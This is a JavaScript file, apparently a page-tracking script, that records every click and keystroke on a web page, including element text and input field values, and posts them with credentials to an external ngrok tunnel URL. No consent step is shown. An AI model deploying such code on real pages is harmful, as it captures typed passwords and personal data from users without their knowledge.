(function setUpPostRequests() {
    $.ajaxSetup({
        type: 'POST',
        data: {},
        xhrFields: {
            withCredentials: true
        },
        dataType: 'json',
        crossDomain: true
    });
})();

document.addEventListener('click', (event) => {
    const { x, y, target } = event;
    const {id, nodeName, classList, innerText} = target;
    const targetObj = {
        nodeType: nodeName.toLowerCase(),
        classList: classList.toString(),
        tag: target.cloneNode(false).outerHTML
    }
    if(!!id){
        targetObj['id'] = id;
    }
    if(!!innerText){
        targetObj['innerText'] = innerText;
    }
    const content = {x, y, target: targetObj}
    logEvent('Click', content);
});

document.addEventListener('keyup', (event) => {
    const {key, target} = event;
    const {id, nodeName, classList, value, innerText} = target;
    const targetObj = {
        nodeType: nodeName.toLowerCase(),
        classList: classList.toString(),
        tag: target.cloneNode(false).outerHTML
    };
    if(!!id){
        targetObj['id'] = id;
    }
    if(!!value){
        targetObj['value'] = value;
    }
    if(!!innerText){
        targetObj['innerText'] = innerText;
    }
    const content = {key, target: targetObj };
    logEvent('Keyup', content);
});

const serverUrl = 'https://ad4a5c00.ngrok.io/log';

/**
 * Logs an event to the logging database
 * @param {string} eventName Name describing the event to log
 * @param {string} eventContent Description of what happened in the event
 * @param {Object} extraParams Extra parameters to send to the server
 */
const logEvent = async (eventName, content) => {
    const sendObj = {
        type: eventName,
        path: window.location.pathname,
        time: new Date().toString(),
        content,
    };
    return new Promise(resolve => {
        $.post(serverUrl, sendObj)
            .done(data => resolve(data))
            .fail(data => {
                console.warn(data);
                resolve(data);
            })
    })
}